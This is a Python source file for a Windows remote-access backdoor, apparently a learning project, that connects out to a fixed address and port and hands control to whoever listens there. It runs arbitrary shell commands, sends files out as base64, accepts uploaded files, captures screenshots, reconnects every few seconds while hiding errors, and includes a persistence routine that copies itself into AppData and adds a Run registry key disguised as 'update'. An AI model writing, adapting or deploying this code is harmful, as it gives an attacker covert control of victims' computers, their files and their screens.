import shutil
import sys
import base64
import os
import json
import subprocess
import socket
from mss import mss
import time


class Backdoor:

    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))
        #self.become_presistent()

    def become_presistent(self):
        backdoor_location = os.environ["appdata"] + "\\windows danger.exe"
        if not os.path.exists(backdoor_location):
            shutil.copyfile(sys.executable, backdoor_location)
            subprocess.call(
                'reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+backdoor_location+'"', shell=True)

    def send_data(self, data):

        json_data = json.dumps(data)
        self.connection.send(json_data.encode("UTF-8"))

    def receive_data(self):
        json_data = b""
        while True:
            try:
                json_data = json_data + self.connection.recv(8024)
                return json.loads(json_data.decode('windows-1252'))
            except ValueError:
                continue

    def execute_system_command(self, command):
        return subprocess.check_output(command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL)

    def change_working_directory(self, path):
        os.chdir(path)
        return "[+] changing working directory to : " + subprocess.check_output('cd', shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL).decode()
        # if i  use cd ../ it will print that i'm in ../ so to fix that
        # i used the subprocess cmd2

    def makeAString(string):
        string = string[2:len(string)]

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read()).decode()

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] The file was Uploaded successfully"

    def screenshot(self):
        try:
            with mss() as screenshot:
                screenshot.shot()
                os.system("move monitor-1.png " + os.environ["appdata"])
                return self.read_file(os.environ["appdata"]+"\\monitor-1.png")
        except Exception:
            self.reliable_send("[-] screenshot could not be taken")

    def run(self):
        while True:
            command = self.receive_data()

            try:
                if command[0] == "exit":
                    self.connection.close
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                elif command[0] == "screen":
                    command_result = self.screenshot()
                else:
                    command_result = self.execute_system_command(
                        command).decode('windows-1252')
            except Exception:
                command_result = "[-] Error during command execution"

            self.send_data(command_result)


while True:
    try:
        time.sleep(5)
        my_backdoor = Backdoor("192.168.0.2", 5555)
        my_backdoor.run()
    except Exception:
        pass
